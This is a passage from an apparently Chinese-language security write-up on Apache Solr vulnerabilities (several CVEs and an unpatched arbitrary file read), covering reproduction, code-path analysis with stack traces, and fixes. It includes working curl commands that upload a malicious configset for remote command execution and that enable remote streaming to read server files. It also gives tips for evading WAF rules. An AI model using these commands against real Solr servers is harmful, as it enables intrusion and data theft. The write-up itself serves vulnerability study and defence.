    handleRequestBody:269, SearchHandler (org.apache.solr.handler.component)
    handleRequest:166, RequestHandlerBase (org.apache.solr.handler)
    execute:2306, SolrCore (org.apache.solr.core)
    execute:658, HttpSolrCall (org.apache.solr.servlet)
    call:464, HttpSolrCall (org.apache.solr.servlet)
    doFilter:345, SolrDispatchFilter (org.apache.solr.servlet)
    doFilter:296, SolrDispatchFilter (org.apache.solr.servlet)
修复，增加了XXE的通用防御  
**RCE:**
这个都不太想调试了，问题类方法是org.apache.solr.core.RunExecutableListener#exec
官方修复呢也是直接把这个类删了
### 2.5 CVE-2018-8026
上传configset
解析配置文件xml时造成xxe，具体分析复现移步[https://xz.aliyun.com/t/2448](https://xz.aliyun.com/t/2448?fileGuid=It0Qkg2AiecFMx62)
具体看org.apache.solr.schema.FileExchangeRateProvider修复，都换成SafeXMLParsing了
### 2.6 CVE-2019-0193
#### 2.6.1 复现
POC:
#### 2.6.2 分析
同样是DataImportHandler出问题
进入到Dataimport功能页面，开启debug，默认给出了如下xml
             '${dataimporter.last_index_time}'">
                 '${dataimporter.last_index_time}'"
                        parentDeltaQuery="select ID from item where ID=${feature.ITEM_ID}">
                 '${dataimporter.last_index_time}'"
                        parentDeltaQuery="select ID from item where ID=${item_category.ITEM_ID}">
                     '${dataimporter.last_index_time}'"
                            parentDeltaQuery="select ITEM_ID, CATEGORY_ID from item_category where CATEGORY_ID=${category.ID}">
entity
标签中支持执行script，且支持jndi，也就是漏洞触发的地方，具体dataimport支持的功能参阅官方文档[https://solr.apache.org/guide/8_6/uploading-structured-data-store-data-with-the-data-import-handler.html](https://solr.apache.org/guide/8_6/uploading-structured-data-store-data-with-the-data-import-handler.html?fileGuid=It0Qkg2AiecFMx62)  
补丁增加了
enable.dih.dataConfigParam（默认为false）只有启动solr的时候加上参数-Denable.dih.dataConfigParam=true 才会被设置为true。利用失败如下
### 2.7 CVE-2019-0192
#### 2.7.1 复现
[https://github.com/mpgn/CVE-2019-0192/](https://github.com/mpgn/CVE-2019-0192/?fileGuid=It0Qkg2AiecFMx62)
#### 2.7.2 分析
Solr支持动态的更新配置，但是更新的并不是Solrconfig.xml 而是configoverlay.json
官方文档参考如下
> Config API可以使用类似REST的API调用来处理您的solrconfig.xml的各个方面。  
>
> 此功能默认启用，并且在SolrCloud和独立模式下的工作方式类似。许多通常编辑的属性（如缓存大小和提交设置）和请求处理程序定义可以使用此API进行更改。  
>
> 使用此API时，solrconfig.xml不会更改。相反，所有编辑的配置都存储在一个名为configoverlay.json的文件中。该configoverlay.json中值覆盖solrconfig.xml中的值。
所以加载core的时候自然会加载configoverlay.json文件，问题也出在这里，精心构造的configoverlay.json可以触发org.apache.solr.core.SolrConfig的危险构造方法
    public SolrConfig(SolrResourceLoader loader, String name, InputSource is) throws ParserConfigurationException, IOException, SAXException {......}
进而触发org.apache.solr.core.SolrCore#initInfoRegistry
修复，新版本直接不支持jmx
### 2.8 CVE-2019-17558
#### 2.8.1 复现
#### 2.8.2 分析
Velocity模板引擎注入首先触发的话，需要通过config
api开启模板引擎开关params.resource.loader.enabled，Solr提供给管理员方便管理的配置api，正常功能，由于Solr默认安装为未授权，所以攻击者可以直接配置
再看下模板命令执行，是返回内容进行模板渲染的时候发生的代码注入
org.apache.solr.servlet.HttpSolrCall#writeResponse
org.apache.solr.response.QueryResponseWriterUtil#writeQueryResponse
最后进入到模板引擎渲染阶段org.apache.solr.response.VelocityResponseWriter#write
此时部分调用炸
    write:151, VelocityResponseWriter (org.apache.solr.response)
    writeQueryResponse:65, QueryResponseWriterUtil (org.apache.solr.response)
    writeResponse:732, HttpSolrCall (org.apache.solr.servlet)
    call:473, HttpSolrCall (org.apache.solr.servlet)
    doFilter:345, SolrDispatchFilter (org.apache.solr.servlet)
### 2.9 CVE-2020-13957
官方API参考文档
[https://lucene.apache.org/solr/guide/8_4/configsets-api.html#configsets-api](https://lucene.apache.org/solr/guide/8_4/configsets-api.html#configsets-api?fileGuid=It0Qkg2AiecFMx62)
首先准备配置文件
    docker cp c3:/opt/solr-8.2.0/server/solr/configsets/_default/conf ./
修改solrconfig.xml velocity.params.resource.loader.enabled:false 为true
目录如下
压缩为zip，通过Configset API上传到服务器
    curl -X POST --header "Content-Type:application/octet-stream" --data-binary @sssconfigset.zip "http://localhost:8983/solr/admin/configs?action=UPLOAD&name=sssConfigSet"
配置文件上传成功
通过API创建新的collecton，或者从前台创建也可
创建成功
执行命令
其实是官方正常功能
### 2.10 全版本任意文件读取(官方拒绝修复)
默认安装未授权情况下，各项配置皆为默认
下载Solr最新版本
[http://archive.apache.org/dist/lucene/solr/8.80/solr-8.8.0.tgz](http://archive.apache.org/dist/lucene/solr/8.7.0/solr-8.7.0.tgz?fileGuid=It0Qkg2AiecFMx62)
#
**POC**
    curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://192.168.33.130:8983/solr/db/config -H 'Content-type:application/json'
    curl "http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///C:/a.txt"
#### **复现**
**1.第一步**
    curl -d '{  "set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' http://192.168.33.130:8983/solr/db/config -H 'Content-type:application/json'
2.第二步
    curl "http://192.168.33.130:8983/solr/db/debug/dump?param=ContentStreams" -F "stream.url=file:///C:/a.txt"
## 3.漏洞信息跟进
[https://cwiki.apache.org/confluence/display/solr/SolrSecurity](https://cwiki.apache.org/confluence/display/solr/SolrSecurity?fileGuid=It0Qkg2AiecFMx62)
[https://issues.apache.org/jira/browse/SOLR](https://issues.apache.org/jira/browse/SOLR?fileGuid=It0Qkg2AiecFMx62)
## 4.厂商防护及绕过思路
这种组件直接放内网就好了，或者一定配置身份校验，且Solr路由写的比较死，厂商提取规则时只要将url过滤完整即可，不会存在绕过情况。
绕过的话，虽然说每个漏洞url较为固定，但是每个功能的触发点皆为每个core或collection，core的名称包含在url中，且生产环境中为用户自定义，很多规则编写者通常只将示例example加入检测，可绕过几率很高。
# 四、个人思考
Apache Solr整体默认安装为未授权，且大部分资产都为未授权，提供众多api接口，支持未授权用户通过config api更改配置文件，攻击面较大。
# 五、参考链接
[https://solr.apache.org/guide/8_6/](https://solr.apache.org/guide/8_6/?fileGuid=It0Qkg2AiecFMx62)
[https://caiqiqi.github.io/2019/11/03/Apache-Solr%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/](https://caiqiqi.github.io/2019/11/03/Apache-Solr%E6%BC%8F%E6%B4%9E%E5%90%88%E9%9B%86/?fileGuid=It0Qkg2AiecFMx62)
[https://baike.baidu.com/item/apache%20solr](https://baike.baidu.com/item/apache%20solr?fileGuid=It0Qkg2AiecFMx62)
[https://cwiki.apache.org/confluence/display/solr/SolrSecurity](https://cwiki.apache.org/confluence/display/solr/SolrSecurity?fileGuid=It0Qkg2AiecFMx62)
[https://www.jianshu.com/p/03b1199dec2c](https://www.jianshu.com/p/03b1199dec2c?fileGuid=It0Qkg2AiecFMx62)
[https://zhuanlan.zhihu.com/p/71629409](https://zhuanlan.zhihu.com/p/71629409?fileGuid=It0Qkg2AiecFMx62)
[https://issues.apache.org/jira/browse/SOLR-12770](https://issues.apache.org/jira/browse/SOLR-12770?fileGuid=It0Qkg2AiecFMx62)
[https://xz.aliyun.com/t/8374](https://xz.aliyun.com/t/8374?fileGuid=It0Qkg2AiecFMx62)
[https://www.ebounce.cn/web/73.html](https://www.ebounce.cn/web/73.html?fileGuid=It0Qkg2AiecFMx62)
[https://developer.aliyun.com/article/616505](https://developer.aliyun.com/article/616505?fileGuid=It0Qkg2AiecFMx62)
[https://www.jianshu.com/p/d3d83b6cb17c](https://www.jianshu.com/p/d3d83b6cb17c?fileGuid=It0Qkg2AiecFMx62)
[https://www.cnblogs.com/leeSmall/p/8992708.html](https://www.cnblogs.com/leeSmall/p/8992708.html?fileGuid=It0Qkg2AiecFMx62)
[https://zhouj000.github.io/2019/01/24/solr-6/](https://zhouj000.github.io/2019/01/24/solr-6/?fileGuid=It0Qkg2AiecFMx62)
[https://juejin.im/post/6844903949116391431](https://juejin.im/post/6844903949116391431?fileGuid=It0Qkg2AiecFMx62)
[http://codingdict.com/article/9427](http://codingdict.com/article/9427?fileGuid=It0Qkg2AiecFMx62)
[https://xz.aliyun.com/t/2448](https://xz.aliyun.com/t/2448?fileGuid=It0Qkg2AiecFMx62)
[https://xz.aliyun.com/t/1523#toc-1](https://xz.aliyun.com/t/1523#toc-1?fileGuid=It0Qkg2AiecFMx62)
[https://paper.seebug.org/1009/](https://paper.seebug.org/1009/?fileGuid=It0Qkg2AiecFMx62)
[https://xz.aliyun.com/t/4422](https://xz.aliyun.com/t/4422?fileGuid=It0Qkg2AiecFMx62)